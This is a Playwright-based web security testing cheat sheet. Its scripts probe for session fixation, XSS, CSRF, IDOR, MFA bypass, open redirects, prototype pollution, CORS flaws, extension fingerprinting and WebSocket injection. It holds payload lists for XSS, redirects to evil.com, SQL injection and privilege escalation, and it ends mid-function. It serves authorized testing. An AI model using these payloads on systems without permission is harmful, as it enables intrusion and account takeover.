# Browser QA Payloads

## Playwright Commands

### Setup
```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=False)
    page = browser.new_page()
    page.goto("https://example.com")
```

### Async Setup
```python
import asyncio
from playwright.async_api import async_playwright

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        context = await browser.new_context(
            ignore_https_errors=True,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        )
        page = await context.new_page()
        await page.goto("https://target.example.com")

asyncio.run(main())
```

### Navigation & Interaction
```python
# Click element
page.click("button#submit")

# Fill form
page.fill("input#username", "admin")
page.fill("input#password", "test")

# Submit form
page.click("button[type=submit]")

# Wait for navigation
page.wait_for_load_state("networkidle")

# Wait for specific element
page.wait_for_selector(".dashboard", timeout=5000)

# Select dropdown
page.select_option("select#role", "admin")

# Upload file
page.set_input_files("input[type=file]", "payload.pdf")
```

### Authentication Testing
```python
# Login and save session
page.goto("https://target.example.com/login")
page.fill("#email", "user@example.com")
page.fill("#password", "password123")
page.click("button[type=submit]")
page.wait_for_url("**/dashboard")

# Save authenticated state
context.storage_state(path="auth_state.json")

# Reuse authenticated session
context = browser.new_context(storage_state="auth_state.json")
```

### Session Fixation Test
```python
# Get session before login
cookies_before = page.context.cookies()
session_before = next((c for c in cookies_before if c['name'] == 'session_id'), None)

# Perform login
page.fill("#username", "admin")
page.fill("#password", "password")
page.click("#login")
page.wait_for_load_state("networkidle")

# Check if session changed
cookies_after = page.context.cookies()
session_after = next((c for c in cookies_after if c['name'] == 'session_id'), None)

if session_before and session_after and session_before['value'] == session_after['value']:
    print("VULNERABLE: Session fixation - session ID unchanged after login")
```

## Network Monitoring

### Request Interception
```python
# Log all requests
def handle_request(request):
    print(f"{request.method} {request.url}")
    if request.post_data:
        print(f"  Body: {request.post_data[:200]}")

page.on("request", handle_request)

# Block specific resources
page.route("**/*.{png,jpg,jpeg,gif,svg}", lambda route: route.abort())

# Modify request headers
def add_headers(route):
    headers = route.request.headers
    headers["X-Custom-Header"] = "injected"
    route.continue_(headers=headers)

page.route("**/*", add_headers)
```

### Response Interception
```python
# Monitor API responses
def handle_response(response):
    if "/api/" in response.url:
        print(f"[{response.status}] {response.url}")
        if response.status >= 400:
            print(f"  Error body: {response.text()[:500]}")

page.on("response", handle_response)
```

### Capture Network Traffic
```python
# Record HAR file
context = browser.new_context(record_har_path="traffic.har")
page = context.new_page()
page.goto("https://target.example.com")
# ... perform actions ...
context.close()  # HAR file written on close
```

## Cookie Analysis

```python
# Get all cookies
cookies = page.context.cookies()
for cookie in cookies:
    flags = []
    if not cookie.get('httpOnly'): flags.append("NO-HttpOnly")
    if not cookie.get('secure'): flags.append("NO-Secure")
    if cookie.get('sameSite') == 'None': flags.append("SameSite=None")
    if flags:
        print(f"WARNING {cookie['name']}: {', '.join(flags)}")
```

### Cookie Manipulation
```python
# Add cookie
page.context.add_cookies([{
    "name": "admin",
    "value": "true",
    "domain": "target.example.com",
    "path": "/"
}])

# Clear cookies and test access
page.context.clear_cookies()
page.goto("https://target.example.com/admin")
```

## XSS Payload Injection

```python
# Reflected XSS test
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "'><script>alert(document.domain)</script>",
    "\"><img src=x onerror=alert(1)>",
    "{{7*7}}",  # Template injection
]

for payload in xss_payloads:
    page.fill("input#search", payload)
    page.click("button#search-submit")
    page.wait_for_load_state("domcontentloaded")
    
    # Check if payload reflected unescaped
    content = page.content()
    if payload in content and "&lt;" not in content.split(payload)[0][-50:]:
        print(f"POTENTIAL XSS: {payload}")
    
    page.go_back()
```

### DOM XSS Detection
```python
# Monitor DOM mutations for script injection
page.evaluate("""
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((m) => {
            m.addedNodes.forEach((node) => {
                if (node.nodeName === 'SCRIPT') {
                    window.__xss_detected = true;
                }
            });
        });
    });
    observer.observe(document.body, {childList: true, subtree: true});
""")

# Inject payload via URL fragment
page.goto("https://target.example.com/page#<script>alert(1)</script>")
xss_found = page.evaluate("window.__xss_detected || false")
```

## CSRF Testing

```python
# Check for CSRF token
page.goto("https://target.example.com/settings")
csrf_token = page.locator("input[name=_csrf]").get_attribute("value")
if not csrf_token:
    print("WARNING: No CSRF token found on form")

# Test if form works without CSRF token
page.evaluate("""
    const form = document.querySelector('form');
    const csrfInput = form.querySelector('input[name="_csrf"]');
    if (csrfInput) csrfInput.remove();
    form.submit();
""")
```

## Evidence Collection

### Screenshot Evidence
```python
# Full page screenshot
page.screenshot(path="evidence/full_page.png", full_page=True)

# Element-specific screenshot
page.locator(".vulnerability-detail").screenshot(path="evidence/vuln_detail.png")

# Screenshot on failure
try:
    page.click("#nonexistent", timeout=3000)
except Exception as e:
    page.screenshot(path=f"evidence/error_{int(time.time())}.png")
```

### Console Log Capture
```python
# Capture console messages
console_messages = []
page.on("console", lambda msg: console_messages.append(f"[{msg.type}] {msg.text}"))

# Check for sensitive data leaks in console
page.goto("https://target.example.com")
for msg in console_messages:
    if any(keyword in msg.lower() for keyword in ["password", "token", "secret", "api_key"]):
        print(f"DATA LEAK IN CONSOLE: {msg}")
```

## Multi-Page Testing

```python
# Test all forms on a page
forms = page.locator("form").all()
for i, form in enumerate(forms):
    action = form.get_attribute("action")
    method = form.get_attribute("method") or "GET"
    inputs = form.locator("input").all()
    print(f"Form {i}: {method} {action} ({len(inputs)} inputs)")
```

### Crawl and Test
```python
# Discover links and test each page
visited = set()
to_visit = ["https://target.example.com"]

while to_visit:
    url = to_visit.pop(0)
    if url in visited:
        continue
    visited.add(url)
    
    page.goto(url)
    links = page.locator("a[href]").all()
    for link in links:
        href = link.get_attribute("href")
        if href and href.startswith("/"):
            full_url = f"https://target.example.com{href}"
            if full_url not in visited:
                to_visit.append(full_url)
```

## Authentication Flow Testing

### Login Bypass Detection
```python
# Test direct access to authenticated pages without login
protected_paths = [
    "/admin", "/dashboard", "/settings", "/api/users",
    "/internal", "/management", "/profile/edit"
]

results = []
for path in protected_paths:
    # Fresh context with no auth state
    ctx = browser.new_context()
    pg = ctx.new_page()
    response = pg.goto(f"https://target.example.com{path}")
    
    is_redirected = "/login" in pg.url or "/auth" in pg.url
    status = response.status
    
    if not is_redirected and status == 200:
        results.append(f"BYPASS: {path} accessible without auth (HTTP {status})")
    elif status == 403:
        results.append(f"OK: {path} returns 403")
    elif is_redirected:
        results.append(f"OK: {path} redirects to login")
    
    ctx.close()

for r in results:
    print(r)
```

### Broken Authentication via Parameter Tampering
```python
# Test privilege escalation by modifying user identifiers
page.goto("https://target.example.com/login")
page.fill("#username", "lowpriv_user")
page.fill("#password", "password123")
page.click("button[type=submit]")
page.wait_for_url("**/dashboard")

# Capture current user ID from API calls
user_id = None
def capture_user_id(response):
    global user_id
    if "/api/me" in response.url or "/api/user" in response.url:
        try:
            data = response.json()
            user_id = data.get("id") or data.get("user_id")
        except:
            pass

page.on("response", capture_user_id)
page.reload()
page.wait_for_load_state("networkidle")

# Attempt IDOR by accessing other user profiles
if user_id:
    for target_id in [1, 2, user_id - 1, user_id + 1, 0, 9999]:
        resp = page.request.get(
            f"https://target.example.com/api/users/{target_id}"
        )
        if resp.status == 200 and target_id != user_id:
            print(f"IDOR VULN: Can access user {target_id} data as user {user_id}")
```

### Session Token Analysis
```python
import hashlib
import base64
import json

# Collect multiple session tokens to detect patterns
tokens = []
for i in range(5):
    ctx = browser.new_context()
    pg = ctx.new_page()
    pg.goto("https://target.example.com/login")
    pg.fill("#username", "testuser")
    pg.fill("#password", "testpass")
    pg.click("button[type=submit]")
    pg.wait_for_load_state("networkidle")
    
    cookies = ctx.cookies()
    session = next((c for c in cookies if "sess" in c["name"].lower()), None)
    if session:
        tokens.append(session["value"])
    ctx.close()

# Analyze token entropy and structure
for i, token in enumerate(tokens):
    print(f"Token {i}: length={len(token)}")
    # Check if base64 encoded JWT
    parts = token.split(".")
    if len(parts) == 3:
        try:
            header = json.loads(base64.b64decode(parts[0] + "=="))
            payload = json.loads(base64.b64decode(parts[1] + "=="))
            print(f"  JWT Header: {header}")
            print(f"  JWT Payload: {payload}")
            if header.get("alg") == "none":
                print("  CRITICAL: Algorithm 'none' - signature bypass possible")
        except:
            pass

# Check for sequential/predictable tokens
if len(tokens) >= 2:
    if tokens[0][:8] == tokens[1][:8]:
        print("WARNING: Tokens share common prefix - possible weak randomness")
```

### Multi-Factor Authentication Bypass
```python
# Test MFA bypass by skipping the verification step
page.goto("https://target.example.com/login")
page.fill("#username", "admin")
page.fill("#password", "password123")
page.click("button[type=submit]")

# Should be on MFA page now
page.wait_for_url("**/mfa**")
mfa_url = page.url

# Attempt to skip MFA by navigating directly to dashboard
page.goto("https://target.example.com/dashboard")
if "/dashboard" in page.url and "/login" not in page.url and "/mfa" not in page.url:
    print("CRITICAL: MFA bypass - direct navigation to dashboard works")

# Test MFA with empty/invalid codes
page.goto(mfa_url)
invalid_codes = ["000000", "123456", "", "999999"]
for code in invalid_codes:
    page.fill("#mfa-code", code)
    page.click("#verify")
    page.wait_for_load_state("networkidle")
    if "/dashboard" in page.url:
        print(f"CRITICAL: MFA bypass with code '{code}'")
        break
    # Check for rate limiting
    if "too many" not in page.content().lower() and "locked" not in page.content().lower():
        print("WARNING: No rate limiting on MFA attempts")
```

## DOM-based Vulnerability Detection

### DOM XSS Source-Sink Analysis
```javascript
// Playwright JavaScript - Inject DOM XSS detection hooks
await page.addInitScript(() => {
    window.__domXssFindings = [];
    
    // Monitor dangerous sinks
    const originalInnerHTML = Object.getOwnPropertyDescriptor(
        Element.prototype, 'innerHTML'
    );
    Object.defineProperty(Element.prototype, 'innerHTML', {
        set(value) {
            if (typeof value === 'string' && (
                value.includes('<script') ||
                value.includes('onerror') ||
                value.includes('onload') ||
                value.includes('javascript:')
            )) {
                window.__domXssFindings.push({
                    sink: 'innerHTML',
                    value: value.substring(0, 200),
                    element: this.tagName,
                    stack: new Error().stack
                });
            }
            return originalInnerHTML.set.call(this, value);
        },
        get() { return originalInnerHTML.get.call(this); }
    });

    // Monitor document.write
    const origWrite = document.write.bind(document);
    document.write = function(content) {
        if (content.includes('<script') || content.includes('onerror')) {
            window.__domXssFindings.push({
                sink: 'document.write',
                value: content.substring(0, 200),
                stack: new Error().stack
            });
        }
        return origWrite(content);
    };

    // Monitor eval
    const origEval = window.eval;
    window.eval = function(code) {
        window.__domXssFindings.push({
            sink: 'eval',
            value: String(code).substring(0, 200),
            stack: new Error().stack
        });
        return origEval(code);
    };
});
```

### Prototype Pollution Detection
```javascript
// Test for prototype pollution via URL parameters and JSON input
await page.addInitScript(() => {
    window.__protoPolluted = false;
    
    // Freeze a canary on Object.prototype
    Object.defineProperty(Object.prototype, '__polluted__', {
        get() { return undefined; },
        set(val) {
            window.__protoPolluted = true;
            window.__pollutionPayload = val;
            console.error('PROTOTYPE POLLUTION DETECTED:', val);
        },
        configurable: true
    });
});

// Test pollution via URL parameters
const pollutionPayloads = [
    "?__proto__[polluted]=true",
    "?constructor[prototype][polluted]=true",
    "?__proto__.polluted=true",
    "#__proto__[polluted]=true"
];

for (const payload of pollutionPayloads) {
    await page.goto(`https://target.example.com/page${payload}`);
    await page.waitForLoadState('networkidle');
    
    const polluted = await page.evaluate(() => window.__protoPolluted);
    if (polluted) {
        console.log(`VULN: Prototype pollution via ${payload}`);
    }
}

// Test pollution via JSON merge in forms
await page.goto('https://target.example.com/settings');
await page.evaluate(() => {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        const hiddenInput = document.createElement('input');
        hiddenInput.type = 'hidden';
        hiddenInput.name = '__proto__[isAdmin]';
        hiddenInput.value = 'true';
        form.appendChild(hiddenInput);
    });
});
```

### Open Redirect Detection
```python
# Test for open redirect vulnerabilities
redirect_payloads = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%00.target.example.com",
    "https://target.example.com@evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "/redirect?url=https://evil.com",
    "https://evil.com#@target.example.com",
]

# Find redirect parameters in the application
page.goto("https://target.example.com")
links = page.evaluate("""() => {
    const urls = [];
    document.querySelectorAll('a[href*="redirect"], a[href*="url="], a[href*="next="], a[href*="return"]').forEach(a => {
        urls.push(a.href);
    });
    return urls;
}""")

# Test each redirect endpoint with malicious URLs
redirect_params = ["redirect", "url", "next", "return_to", "returnUrl", "goto", "dest"]
for param in redirect_params:
    for payload in redirect_payloads:
        test_url = f"https://target.example.com/login?{param}={payload}"
        response = page.goto(test_url)
        
        # Check if we got redirected to the evil domain
        final_url = page.url
        if "evil.com" in final_url:
            print(f"OPEN REDIRECT: param={param}, payload={payload}")
            print(f"  Redirected to: {final_url}")
```

### DOM Clobbering Detection
```javascript
// Detect DOM clobbering vulnerabilities
await page.addInitScript(() => {
    window.__clobberFindings = [];
    
    // Monitor named access on window
    const handler = {
        get(target, prop) {
            if (typeof prop === 'string' && document.getElementsByName(prop).length > 0) {
                const el = document.getElementsByName(prop)[0];
                if (el.tagName === 'IMG' || el.tagName === 'FORM' || el.tagName === 'A') {
                    window.__clobberFindings.push({
                        property: prop,
                        element: el.tagName,
                        id: el.id,
                        name: el.name
                    });
                }
            }
            return Reflect.get(target, prop);
        }
    };
});

// Inject clobbering payloads into user-controlled HTML areas
const clobberPayloads = [
    '<img name="currentUser" src="x">',
    '<form id="config"><input name="apiUrl" value="https://evil.com"></form>',
    '<a id="baseUrl" href="https://evil.com">',
    '<img id="isAdmin" name="isAdmin" src="x">',
];

for (const payload of clobberPayloads) {
    // If there's a user-controlled HTML injection point
    await page.evaluate((html) => {
        const div = document.createElement('div');
        div.innerHTML = html;
        document.body.appendChild(div);
    }, payload);
    
    // Check if application logic is affected
    const findings = await page.evaluate(() => window.__clobberFindings);
    if (findings.length > 0) {
        console.log('DOM CLOBBERING:', JSON.stringify(findings));
    }
}
```

## Network Traffic Interception

### Full API Request/Response Logging
```python
import json
from datetime import datetime

# Comprehensive API traffic capture for security analysis
api_log = []

def log_request(request):
    if "/api/" in request.url or "graphql" in request.url:
        entry = {
            "timestamp": datetime.now().isoformat(),
            "direction": "request",
            "method": request.method,
            "url": request.url,
            "headers": dict(request.headers),
            "body": request.post_data,
        }
        api_log.append(entry)
        
        # Flag sensitive data in requests
        if request.post_data:
            sensitive_keys = ["password", "token", "secret", "credit_card", "ssn"]
            for key in sensitive_keys:
                if key in request.post_data.lower():
                    print(f"SENSITIVE DATA IN REQUEST: {key} found in {request.url}")

def log_response(response):
    if "/api/" in response.url or "graphql" in response.url:
        try:
            body = response.text()
        except:
            body = "<binary>"
        entry = {
            "timestamp": datetime.now().isoformat(),
            "direction": "response",
            "status": response.status,
            "url": response.url,
            "headers": dict(response.headers),
            "body": body[:2000],
        }
        api_log.append(entry)
        
        # Check for security headers
        security_headers = [
            "x-content-type-options", "x-frame-options",
            "strict-transport-security", "content-security-policy"
        ]
        missing = [h for h in security_headers if h not in response.headers]
        if missing:
            print(f"MISSING SECURITY HEADERS on {response.url}: {missing}")

page.on("request", log_request)
page.on("response", log_response)
```

### GraphQL Introspection and Abuse Detection
```python
# Test GraphQL endpoint for introspection and injection
graphql_endpoints = ["/graphql", "/api/graphql", "/gql", "/query"]

for endpoint in graphql_endpoints:
    url = f"https://target.example.com{endpoint}"
    
    # Test introspection query
    introspection_query = """
    {"query": "{ __schema { types { name fields { name type { name } } } } }"}
    """
    response = page.request.post(url, data=introspection_query, headers={
        "Content-Type": "application/json"
    })
    
    if response.status == 200:
        data = response.json()
        if "__schema" in str(data):
            print(f"INTROSPECTION ENABLED: {url}")
            # Extract sensitive type names
            types = data.get("data", {}).get("__schema", {}).get("types", [])
            sensitive_types = [t["name"] for t in types 
                            if any(s in t["name"].lower() 
                                   for s in ["admin", "secret", "internal", "private"])]
            if sensitive_types:
                print(f"  Sensitive types exposed: {sensitive_types}")
    
    # Test for query depth/complexity limits
    deep_query = '{"query": "{ users { posts { comments { author { posts { comments { id } } } } } } }"}'
    response = page.request.post(url, data=deep_query, headers={
        "Content-Type": "application/json"
    })
    if response.status == 200:
        print(f"WARNING: No query depth limit on {url}")
```

### Sensitive Data Exposure in Responses
```python
import re

# Monitor all responses for sensitive data leakage
sensitive_patterns = {
    "email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
    "jwt_token": r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
    "aws_key": r'AKIA[0-9A-Z]{16}',
    "private_key": r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',
    "credit_card": r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',
    "ssn": r'\b\d{3}-\d{2}-\d{4}\b',
    "internal_ip": r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b',
}

findings = []

def scan_response(response):
    if response.status == 200:
        try:
            body = response.text()
        except:
            return
        for name, pattern in sensitive_patterns.items():
            matches = re.findall(pattern, body)
            if matches:
                findings.append({
                    "url": response.url,
                    "type": name,
                    "count": len(matches),
                    "sample": matches[0][:50]
                })

page.on("response", scan_response)

# Crawl the application
page.goto("https://target.example.com")
page.wait_for_load_state("networkidle")

# Navigate through key pages
for path in ["/profile", "/settings", "/api/users", "/api/config"]:
    page.goto(f"https://target.example.com{path}")
    page.wait_for_load_state("networkidle")

for f in findings:
    print(f"DATA LEAK [{f['type']}]: {f['url']} ({f['count']} occurrences)")
```

### CORS Misconfiguration Testing
```python
# Test CORS policy by sending requests with various origins
test_origins = [
    "https://evil.com",
    "https://target.example.com.evil.com",
    "null",
    "https://subdomain.target.example.com",
    "http://target.example.com",  # HTTP downgrade
]

for origin in test_origins:
    response = page.request.fetch(
        "https://target.example.com/api/user",
        headers={"Origin": origin}
    )
    
    acao = response.headers.get("access-control-allow-origin", "")
    acac = response.headers.get("access-control-allow-credentials", "")
    
    if acao == origin or acao == "*":
        severity = "CRITICAL" if acac == "true" else "HIGH"
        print(f"{severity}: CORS allows origin '{origin}'")
        if acac == "true":
            print("  Credentials allowed - full account takeover possible")
```

## Visual Regression for Security

### Screenshot Comparison for UI Tampering
```python
from PIL import Image
import imagehash
import os

# Capture baseline screenshots of critical pages
critical_pages = {
    "login": "/login",
    "payment": "/checkout/payment",
    "admin": "/admin/dashboard",
    "settings": "/account/settings",
}

baseline_dir = "evidence/baseline"
current_dir = "evidence/current"
os.makedirs(baseline_dir, exist_ok=True)
os.makedirs(current_dir, exist_ok=True)

def capture_baselines():
    for name, path in critical_pages.items():
        page.goto(f"https://target.example.com{path}")
        page.wait_for_load_state("networkidle")
        page.screenshot(path=f"{baseline_dir}/{name}.png", full_page=True)

def detect_tampering():
    for name, path in critical_pages.items():
        page.goto(f"https://target.example.com{path}")
        page.wait_for_load_state("networkidle")
        page.screenshot(path=f"{current_dir}/{name}.png", full_page=True)
        
        # Compare using perceptual hash
        baseline = Image.open(f"{baseline_dir}/{name}.png")
        current = Image.open(f"{current_dir}/{name}.png")
        
        hash_baseline = imagehash.phash(baseline)
        hash_current = imagehash.phash(current)
        
        diff = hash_baseline - hash_current
        if diff > 10:  # Threshold for significant change
            print(f"UI TAMPERING DETECTED on {name}: hash diff = {diff}")
            print(f"  Baseline: {baseline_dir}/{name}.png")
            print(f"  Current:  {current_dir}/{name}.png")
```

### Phishing Page Detection via Visual Similarity
```python
# Compare target page against known legitimate page
async def detect_phishing(suspect_url, legitimate_url):
    # Capture legitimate page
    legit_ctx = await browser.new_context()
    legit_page = await legit_ctx.new_page()
    await legit_page.goto(legitimate_url)
    await legit_page.wait_for_load_state("networkidle")
    await legit_page.screenshot(path="evidence/legitimate.png")
    
    # Capture suspect page
    suspect_ctx = await browser.new_context()
    suspect_page = await suspect_ctx.new_page()
    await suspect_page.goto(suspect_url)
    await suspect_page.wait_for_load_state("networkidle")
    await suspect_page.screenshot(path="evidence/suspect.png")
    
    # Compare visual similarity
    legit_img = Image.open("evidence/legitimate.png")
    suspect_img = Image.open("evidence/suspect.png")
    
    legit_hash = imagehash.phash(legit_img)
    suspect_hash = imagehash.phash(suspect_img)
    
    similarity = 1 - (legit_hash - suspect_hash) / 64.0
    
    if similarity > 0.85:
        # Check if domains differ
        from urllib.parse import urlparse
        legit_domain = urlparse(legitimate_url).netloc
        suspect_domain = urlparse(suspect_url).netloc
        if legit_domain != suspect_domain:
            print(f"PHISHING DETECTED: {suspect_url}")
            print(f"  Visual similarity: {similarity:.2%}")
            print(f"  Impersonating: {legitimate_url}")
    
    await legit_ctx.close()
    await suspect_ctx.close()
```

### Form Field Injection Detection
```python
# Detect injected form fields (credential harvesting)
def audit_form_fields(page, expected_fields):
    """Compare current form fields against expected baseline."""
    actual_fields = page.evaluate("""() => {
        const fields = [];
        document.querySelectorAll('input, select, textarea').forEach(el => {
            fields.push({
                type: el.type,
                name: el.name,
                id: el.id,
                visible: el.offsetParent !== null,
                autocomplete: el.autocomplete
            });
        });
        return fields;
    }""")
    
    # Find unexpected fields
    expected_names = set(expected_fields)
    actual_names = set(f["name"] for f in actual_fields if f["name"])
    
    injected = actual_names - expected_names
    if injected:
        print(f"INJECTED FIELDS DETECTED: {injected}")
        for field in actual_fields:
            if field["name"] in injected:
                print(f"  {field['name']}: type={field['type']}, visible={field['visible']}")
                if not field["visible"]:
                    print("    WARNING: Hidden field - likely credential harvesting")

# Usage
page.goto("https://target.example.com/login")
expected = ["username", "password", "_csrf"]
audit_form_fields(page, expected)
```

### Content Security Policy Violation Monitoring
```python
# Monitor CSP violations as indicators of injection attacks
csp_violations = []

page.on("console", lambda msg: (
    csp_violations.append(msg.text)
    if "Content Security Policy" in msg.text or "CSP" in msg.text
    else None
))

# Also capture via the SecurityPolicyViolation event
page.evaluate("""() => {
    document.addEventListener('securitypolicyviolation', (e) => {
        window.__cspViolations = window.__cspViolations || [];
        window.__cspViolations.push({
            blockedURI: e.blockedURI,
            violatedDirective: e.violatedDirective,
            originalPolicy: e.originalPolicy,
            sourceFile: e.sourceFile,
            lineNumber: e.lineNumber
        });
    });
}""")

# Navigate and trigger potential violations
page.goto("https://target.example.com")
page.wait_for_load_state("networkidle")

violations = page.evaluate("window.__cspViolations || []")
if violations:
    print(f"CSP VIOLATIONS DETECTED: {len(violations)}")
    for v in violations:
        print(f"  Blocked: {v['blockedURI']} (directive: {v['violatedDirective']})")
```

## Browser Extension Security Testing

### Extension Permission Enumeration
```javascript
// Detect installed extensions via web-accessible resources
const knownExtensions = [
    { name: 'LastPass', id: 'hdokiejnpimakedhajhdlcegeplioahd', resource: 'overlay.html' },
    { name: 'Grammarly', id: 'kbfnbcaeplbcioakkpcpgfkobkghlhen', resource: 'src/shared/config.js' },
    { name: 'MetaMask', id: 'nkbihfbeogaeaoehlefnkodbefgpgknn', resource: 'inpage.js' },
    { name: 'Bitwarden', id: 'nngceckbapebfimnlniiiahkandclblb', resource: 'content/fido2/page-script.js' },
];

const detected = [];
for (const ext of knownExtensions) {
    try {
        const url = `chrome-extension://${ext.id}/${ext.resource}`;
        const response = await page.evaluate(async (testUrl) => {
            try {
                const resp = await fetch(testUrl);
                return resp.status;
            } catch (e) {
                return 0;
            }
        }, url);
        
        if (response === 200) {
            detected.push(ext.name);
            console.log(`EXTENSION DETECTED: ${ext.name} (${ext.id})`);
        }
    } catch (e) {
        // Extension not present
    }
}

if (detected.length > 0) {
    console.log(`Fingerprint: ${detected.length} extensions detected`);
    console.log('Privacy risk: extension fingerprinting possible');
}
```

### Extension Content Script Injection Analysis
```python
# Detect content scripts injected by extensions
page.goto("https://target.example.com")
page.wait_for_load_state("networkidle")

# Check for injected scripts and styles not from the origin
injected_resources = page.evaluate("""() => {
    const resources = [];
    
    // Check for injected script elements
    document.querySelectorAll('script[src]').forEach(s => {
        const src = s.getAttribute('src');
        if (src && (src.startsWith('chrome-extension://') || 
                    src.startsWith('moz-extension://') ||
                    !src.startsWith(window.location.origin))) {
            resources.push({ type: 'script', src: src });
        }
    });
    
    // Check for injected style elements
    document.querySelectorAll('link[rel="stylesheet"]').forEach(l => {
        const href = l.getAttribute('href');
        if (href && (href.startsWith('chrome-extension://') || 
                     href.startsWith('moz-extension://'))) {
            resources.push({ type: 'style', src: href });
        }
    });
    
    // Check for shadow DOMs (often used by extensions)
    const allElements = document.querySelectorAll('*');
    allElements.forEach(el => {
        if (el.shadowRoot) {
            resources.push({ 
                type: 'shadow-dom', 
                element: el.tagName,
                id: el.id 
            });
        }
    });
    
    return resources;
}""")

for resource in injected_resources:
    print(f"INJECTED [{resource['type']}]: {resource.get('src', resource.get('element'))}")
```

### Extension Message Passing Interception
```javascript
// Monitor extension message passing for data exfiltration
await page.addInitScript(() => {
    window.__extensionMessages = [];
    
    // Intercept window.postMessage
    const origPostMessage = window.postMessage.bind(window);
    window.postMessage = function(message, targetOrigin, transfer) {
        window.__extensionMessages.push({
            type: 'postMessage',
            data: JSON.stringify(message).substring(0, 500),
            targetOrigin: targetOrigin,
            timestamp: Date.now()
        });
        return origPostMessage(message, targetOrigin, transfer);
    };
    
    // Listen for incoming messages
    window.addEventListener('message', (event) => {
        if (event.origin !== window.location.origin) {
            window.__extensionMessages.push({
                type: 'incomingMessage',
                origin: event.origin,
                data: JSON.stringify(event.data).substring(0, 500),
                timestamp: Date.now()
            });
        }
    });
    
    // Monitor CustomEvent dispatches (used by some extensions)
    const origDispatch = EventTarget.prototype.dispatchEvent;
    EventTarget.prototype.dispatchEvent = function(event) {
        if (event.type && event.type.includes('extension')) {
            window.__extensionMessages.push({
                type: 'customEvent',
                eventType: event.type,
                detail: JSON.stringify(event.detail || {}).substring(0, 500),
                timestamp: Date.now()
            });
        }
        return origDispatch.call(this, event);
    };
});

// After page interaction, check captured messages
await page.goto('https://target.example.com');
await page.waitForTimeout(3000);

const messages = await page.evaluate(() => window.__extensionMessages);
if (messages.length > 0) {
    console.log(`Captured ${messages.length} extension messages:`);
    messages.forEach(m => console.log(`  [${m.type}] ${m.data}`));
}
```

### Extension Storage Access Testing
```javascript
// Test if page scripts can access extension storage (misconfigured extensions)
await page.evaluate(async () => {
    const results = [];
    
    // Try accessing chrome.storage (should be blocked for web pages)
    if (typeof chrome !== 'undefined' && chrome.storage) {
        results.push('WARNING: chrome.storage accessible from page context');
        try {
            chrome.storage.local.get(null, (items) => {
                if (items && Object.keys(items).length > 0) {
                    results.push(`CRITICAL: Extension storage readable: ${Object.keys(items)}`);
                }
            });
        } catch (e) {
            results.push('OK: chrome.storage.local properly restricted');
        }
    }
    
    // Check for exposed extension APIs
    const extensionAPIs = ['chrome.runtime', 'chrome.tabs', 'chrome.cookies', 'browser.runtime'];
    for (const api of extensionAPIs) {
        try {
            const obj = api.split('.').reduce((o, k) => o && o[k], window);
            if (obj) {
                results.push(`EXPOSED API: ${api} accessible from page`);
            }
        } catch (e) {}
    }
    
    return results;
});
```

## WebSocket Security Testing

### WebSocket Connection Interception
```python
# Intercept and log all WebSocket communications
ws_messages = []

def handle_ws(ws):
    print(f"WebSocket opened: {ws.url}")
    
    def on_frame_sent(payload):
        ws_messages.append({
            "direction": "sent",
            "url": ws.url,
            "data": payload[:1000],
            "timestamp": time.time()
        })
    
    def on_frame_received(payload):
        ws_messages.append({
            "direction": "received",
            "url": ws.url,
            "data": payload[:1000],
            "timestamp": time.time()
        })
    
    ws.on("framesent", on_frame_sent)
    ws.on("framereceived", on_frame_received)
    ws.on("close", lambda: print(f"WebSocket closed: {ws.url}"))

page.on("websocket", handle_ws)

# Navigate and trigger WebSocket connections
page.goto("https://target.example.com/chat")
page.wait_for_timeout(5000)

# Analyze captured messages
for msg in ws_messages:
    # Check for sensitive data in WebSocket frames
    sensitive_keywords = ["token", "password", "session", "auth", "credit"]
    data_lower = msg["data"].lower() if isinstance(msg["data"], str) else ""
    for keyword in sensitive_keywords:
        if keyword in data_lower:
            print(f"SENSITIVE DATA in WS [{msg['direction']}]: {keyword} found")
            print(f"  URL: {msg['url']}")
            print(f"  Data: {msg['data'][:200]}")
```

### WebSocket Injection Testing
```javascript
// Inject malicious payloads into WebSocket messages
await page.addInitScript(() => {
    window.__wsInstances = [];
    
    const OrigWebSocket = window.WebSocket;
    window.WebSocket = function(url, protocols) {
        const ws = new OrigWebSocket(url, protocols);
        window.__wsInstances.push(ws);
        
        // Intercept send to test injection
        const origSend = ws.send.bind(ws);
        ws.send = function(data) {
            console.log(`WS SEND: ${data}`);
            window.__lastWsSent = data;
            return origSend(data);
        };
        
        return ws;
    };
    window.WebSocket.prototype = OrigWebSocket.prototype;
    window.WebSocket.CONNECTING = OrigWebSocket.CONNECTING;
    window.WebSocket.OPEN = OrigWebSocket.OPEN;
    window.WebSocket.CLOSING = OrigWebSocket.CLOSING;
    window.WebSocket.CLOSED = OrigWebSocket.CLOSED;
});

await page.goto('https://target.example.com/realtime');
await page.waitForTimeout(2000);

// Inject payloads through the WebSocket
const injectionPayloads = [
    '{"type":"admin","action":"elevate_privileges"}',
    '{"__proto__":{"isAdmin":true}}',
    '<script>alert("XSS via WS")</script>',
    '{"user_id":1,"role":"admin"}',
    '"; DROP TABLE messages; --',
];

for (const payload of injectionPayloads) {
    await page.evaluate((msg) => {
        if (window.__wsInstances.length > 0) {
            const ws = window.__wsInstances[0];
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(msg);
            }
        }
    }, payload);
    await page.waitForTimeout(500);
}
```

### WebSocket Authentication Bypass
```python
# Test if WebSocket connections enforce authentication
import websockets
import asyncio

async def test_ws_auth_bypass():
